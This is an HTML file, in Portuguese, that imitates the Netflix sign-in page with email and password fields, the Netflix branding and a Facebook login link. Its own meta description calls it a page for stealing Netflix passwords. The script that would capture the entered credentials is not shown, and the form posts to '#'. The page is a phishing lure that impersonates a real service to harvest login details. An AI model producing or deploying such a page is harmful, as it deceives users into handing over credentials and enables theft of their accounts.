<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Pagina para roubar senhas da Netflix">
    <link rel="shortcut icon" href="../../imagem/netflix-logo-circle-png-5.png" type="image/x-icon">
    <title>Netflix</title>
    <link rel="stylesheet" href="login.css">
   
</head>
<body>
    <img src="../../imagem/netflixlogo.png" id="logo" alt="logo Netflix">
    <main>
        <div id="um">
            <form action="#">
                <h1>Entrar</h1>
                <div class="divinput">
                    <input class="input" type="email" id="login" name="email" size="24" placeholder="Email ou nÃºmero de telefone" style="background-color: rgb(59, 59, 59);">
                </div>
                <div class="divinput">
                   <input class="input" type="password" id="senha" name="senha" size="24" placeholder="Senha" style="background-color:  rgb(59, 59, 59);" required>
                   <input class="input" type="submit" value="Entrar" id="submit">
                </div>
                <div id="dois">
                    <div class="divinput">
                        <input type="checkbox" name="remember" id="iremember" style="background-color:  rgb(59, 59, 59);">
                        <label for="iremember">Lembre-se de mim</label>
                    </div>
                    <div>
                    <a href="#">Precisa de ajuda</a>
                </div>
            </form>
        </div>
        <footer>
            <a href="#"><img src="../../imagem/Facebook_logo.png" alt="facebook" id="ifacebook">Conectar-se com o facebook</a>
            <small>Novo por aqui? <a href="#">Assine agora</a></small>
        </footer>
    </main>
    <script src="script.js"></script>
</body>
</html>
